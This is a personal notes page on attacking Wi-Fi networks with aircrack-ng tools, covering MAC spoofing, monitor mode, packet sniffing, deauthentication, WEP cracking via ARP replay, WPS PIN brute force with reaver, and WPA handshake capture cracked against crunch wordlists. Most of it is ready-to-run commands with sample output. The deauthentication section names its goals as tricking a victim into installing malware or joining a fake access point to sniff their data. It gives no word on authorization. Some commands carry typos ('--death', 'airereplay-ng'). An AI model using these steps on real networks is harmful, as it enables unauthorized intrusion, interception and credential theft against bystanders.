-----

* title: Wi-Fi
* description: This article is dedicated to Wi-Fi networks.
* created: 23-07-2021 16:14:00
* modified: 23-07-2021 16:14:00
* keywords: debian, gnu, linux, operating, system, admin, network, wifi, Wi-Fi, lan, security, hacking, wireless
* lang: en

-----

# Table Of Contents

* [Change the mac address of a network device](#change-the-mac-address-of-a-network-device)
* [Wi-Fi Monitor mode requirements](#wi-fi-monitor-mode-requirements)
  * [Know working chipsets with Kali](#know-working-chipsets-with-kali)
* [Change the Wi-Fi mode from managed to monitor](#change-the-wi-fi-mode-from-managed-to-monitor)
* [Sniffing Wi-Fi packets](#sniffing-wi-fi-packets)
   * [Write data to a file](#write-data-to-a-file)
   * [Targeted Packet Sniffing](#targeted-packet-sniffing)
   * [Deauthentication Attack](#deauthentication-attack)
* [WEP Cracking](#wep-cracking)   
   * [Arp attack](#arp-attack) 
* [WPA and WPA2 Cracking](#wpa--wpa2-attack)
   * [WPS attack](#wps-attack)
   * [Creating a wordlist](#creating-a-wordlist)
   * [WPA & WPA2 attack](#wpa--wpa2-attack)
   * [Crack the WPA password based on the wordlist](#crack-the-wpa-password-based-on-the-wordlist)

# aircrack-ng suite

The aircrack-ng suite consists of:

* aircrack-ng
* airdecap-ng
* airmon-ng
* aireplay-ng
* airodump-ng
* airtun-ng
* packetforge-ng
* airbase-ng
* airdecloak-ng
* airolib-ng
* airserv-ng
* buddy-ng
* ivstools
* easside-ng
* tkiptun-ng
* wesside-ng

# Change the mac address of a network device

To be able to change the mac address of a network device, this first need to 
be put down (deactivated). 

    ifconfig wlan0 down
    ifconfig wlan0 hw ether 00:11:22:33:44:55
    ifconfig wlan0 up

Note that when you reboot the computer the mac address is changed back to 
it's original reference.

See also the tool `macchanger`.

# Wi-Fi monitor mode requirements

The ideal is an adapter that both support the 2.4G and the 5G. Ideally also 
with an external antenna.

Not a lot of Wi-Fi 5G adapters support the `monitor` and the `injection` mode.

So careful when buying an adapter and check it supports:

    Monitor mode
    Packet Injection
    Managed mode

Also the brand of the wi-fi adapter doesn't matter, what matter the most is 
the chipset used into the Wi-Fi adapter.

See also:

 * https://www.youtube.com/watch?v=0lqRZ3MWPXY

## Know working chipsets with Kali

 1. Atheros AR9271 (Very good, but only support 2.4G, NOT 5G) - For example 
    the Alfa AWUS036NHA wireless adapter.
 2. Realtek AR8812AU (Support 2.4G and 5G) - For example the AWUS036ACH. The 
    problem with this chipset is that it's support is very recent. Starting 
    from Kali 2007.1 and the chipset is less reliable. So sometimes it 
    disconnects or attacks fails, and you need to restart your attack.

See also:

 * https://kennyvn.com/best-wireless-adapters-kali-linux/

# Change the Wi-Fi mode from managed to monitor

Check that nothing is using the wlan0 device and could interfere:

    ifconfig wlan0 down
    airmon-ng check kill

It will output something like:

Killing these processes:

    PID     NAME
    719     wpa_supplicant
    11318   dhcpclient

Change the mode:

    iwconfig wlan0 mode monitor

The wireless interface will be called `mon0` or something similar.

# Sniffing Wi-Fi packets

By sniffing I mean copying all Wi-Fi packages that are in range.

Check how your wifi card is called with `ifwconfig` after having set it in 
monitor mode.

    airodump-ng mon0

To sniff on 5G (band a)

    airodump-ng --band a mon0

To sniff on all different bands 2.4G and 5G:

Note that this requires a stronger adapter and is a bit slower as it's 
sniffing on different network speed.

    airodump-ng --band abc mon0

## Write data to a file

This allows us to analyse and crack the actual thingy later on.

    airodump-ng mon0 --write my_captured_data mon0

A file starting with the name `my_captured_data` will be created in the 
current directory and with different extensions. Note that airodump added 
append `-01` to the file name.

File extensions are `.csv`, `cap`, `kismet.netxml`, `kismet.csv`.

The most interesting file is the `cap` file which contains all data. Like HTTP 
connections and it's data. But at this stage, and probably like always, the 
data has been encrypted with the WPA2 connection. So it needs to be decrypted 
first.

You can look at the data with `WireShark`. But like said, the data inside is 
encrypted. However, we can already see the device names sources and 
destination. Which can be also a good starting point as you can figure out 
what type of device it is (Apple smartphone, Huawei...)

## Targeted Packet Sniffing

We can also define to sniff on a know ESSID:

for example:

    airodump-ng --bssid F8:23:B2:B9:50:A8 --channel 2 --write my_captured_data mon0

## Deauthentication Attack

To disconnect any client from any network.

 * Works on encrypted networks (WEP, WPA, & WPA2).
 * No need to know the network key/password.
 * No need to connect to the network.

    aireplay-ng --death [#DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
   
For example:

    aireplay-ng --death 100000000 -a F8:23:B2:B9:50:A8 -c 80:E6:50:22:A2:E8 (-D)  mon0
    # -D for the 5G wifi

In some rare cases, the aireplay-ng --deauth fails, and in that case you 
should run the airodump sniffing at the same time in another shell.

Goals

 * This is very handy for social engineering attacks, were you can pretend to 
be from the IT department and ask the user to install some fix app (malware / 
   backdoor) or even tell them to connect to another (faked) Wi-Fi Access 
   Point where there you will sniff all his data and thus only target on 1 
   specific person.
 * It is also handy, when run airodump into parallel to get the WPA handshake 
   which is vital to WPA cracking.
   
# WEP Cracking

WEP stand for Wired Equivalent Privacy.

We need to capture a large number of packets/IVs. So this needs to be done 
when people are using that wireless network. If there's not a lot of traffic 
this will take ages to have the numbers of data packets. But then, we need 
to force the AP to generate new IVs and this is called the arpattack.

You should consider to have around 40.000 data packets before trying 
to crack the packets. And this for the longest 128bit wep key. So it goes 
very very fast even with the strongest and longest WEP password..

Capture the packets with `airodump-ng`:

    airodump-ng --bssid <mac-of-AP> --channel <channel-number> --write web_capture mon0

Analyse the captured IVs and crack the key `aircrack-ng`

    aircrack-ng web_capture-01.cap

After a time it should give you the key and password. Sometimes it does not 
show you the password but only the key.

For example:

    ...
    Opening wep_capture-01.cap
    Attack will be restarted every 5000 caputred ivs.

        KEY FOUND! [ 41:73:32:33:70 ] (ASCII: As23p)
    Decrypted correctly: 100%

As seen in the previous example `41:73:32:33:70` is the key, and `ASCII: 
As23p` the clear text password. To use the key, when you don't see the clear 
text (ascii) password, remove all colons so that the key become 
this `4173323370` and use that, and it should work.

## Arp attack 

This technique is required if there's not enough WEP traffic and to force to 
make some kind of traffic so that we can capture enough packets/IVs.

To do so, first you need to be connected (not associated) to the AP.

    airereplay-ng --fakeauth 0 -a <mac-of-AP> -h <mac-of-wireless-adapter> mon0

Then will see with `aircrack-ng` that your are connected to the APP.

So now it's time to ARP replay

    Then airereplay-ng --arpreplay -b <mac-of-AP> -h <mac-of-wireless-adapter> mon0

Then we need to wait that `aireplay` capture an ARP packet. Once it has got 
one it will force the AP to resend it over and over.

Of course, you need to capture all the packets like a standard sniffing like 
previously done.

# WPA and WPA2 Cracking

Cracking the WPA or WPA2 is the same method.

There are 2 cracking techniques possible.

## WPS attack

A lot of routers do have the WPS feature. If the router is badly configured, 
we can make use of that vulnerability.

**This only works if the router is configured not to use the PBC (Push Button 
Authentication).**

*The cracking process take an average of 10 hours.*

First scan to see which AP do make use of WPS:

    wash --interface mon0

Brut force the pin to try to get the WPA key

    reaver --bssid <mac-target> --channel <number> --interface mon0 -vvv --no-associate

*Some newer `reaver` version has some bug and fails, so it could be we need to 
download and use an older version of `reaver`*

Then we need to fake auth, every 30 seconds:

    aireplay-ng --fakeauth 30 -a <mac-target> <mac-of-wireless-adapter> mon0

## WPA & WPA2 attack

Good to know is that WPA and WPA2 fixes the weaknesses of WEP. So in this 
version of security, there's no useful crackable data into the packets. Only 
packets that are useful are the handshake packets.

 **The handshake does NOT contain data that helps to recover the key. It  
 contains data that can be used to check if a key (password) is valid or not**

From there on, we need to guess (brut force) the data with a wordlist. We 
can download read to use wordlist from the internet, or generate our own one 
with a program.

    airodump-ng --bssid <mac-target> --channel <channel-number> --write wpa_handshake mon0

Now we need to wait that a client connect, because it's only during 
connection time that handshare are send. But like before with the WEP attack 
we can force the deauthentication process, in order words, force that 
handshakes are send.

    aireplay-ng -deauth 4 -a <mac-target> -c <mac-of-wireless-adapter> mon0

We need to keep an eye on the airodump-ng output, and when it has the WPA 
handshake, we can stop aerodump-ng.

## Creating a wordlist

`crunch` can be used to create a wordlist.

For example, generate a word list with 6 up to 8 characters long. With only the 
characters `123abc$` and with the words that start with `a` and end with 
the letter `b`.

    crunch 6 8 123abc$ -o wordlist -t a@@@@b

Note that creating a wordlist can become huge, very very very very very huge.
Look at this example, which will result in a wordlist of 1592 TB !

    $ crunch 6 8 "123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" -o crunch_wordlist 
    Crunch will now generate the following amount of data: 1750868402284224 bytes
    1669758226 MB
    1630623 GB
    1592 TB
    1 PB
    Crunch will now generate the following number of lines: 194901576207663
    crunch:   0% completed generating output

Even when using the compression option it's still very very huge, no matter 
what compression method you use:

    $ crunch 6 8 "123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" -o crunch_wordlist -z lzma
    Crunch will now generate the following amount of data: 1750868402284224 bytes
    1669758226 MB
    1630623 GB
    1592 TB
    1 PB
    Crunch will now generate the following number of lines: 194901576207663 

To create a little list:

    crunch 6 8 abc -o crunch_wordlist_short.txt

To specify that the password list should be 6 characters long and start with 
the letter a and end with the letter b:

    crunch 6 6 abc -o crunch_wordlist_short.txt -t a@@@@b

## Crack the WPA password based on the wordlist

Before we can proceed to this, we need to have captured a handshake and 
created a word list. Once we have both of this we can start brut forcing it 
with:

    aircrack-ng wpa_handshake-01.cap -w my_wordlist.txt

The speed of this process depend of your CPU and the amounts of words in 
your word list it has to test against it. This can really take a lot of time.

**There are online services where you can upload your handshake files and they 
will compute with their huge word list for you on their huge computer systems.**

Like for example:

 * https://gpuhash.me/
 * https://www.onlinehashcrack.com/how-to-crack-WPA-WPA2-networks.php

See also this nice thing `wifite` which is available on Kali: https://github.com/derv82/wifite2

There are also methods to speed up the cracking process:

 * Use GPU instead of CPU
 * Rainbow tables
 * You can pïpe the wordlist as it's create its passwords from `crunc` to 
   `aircrack-ng` so that you don't need to create a huge word list file and 
   storage on your computer.
 * You can also use methods so that you can pause the process.


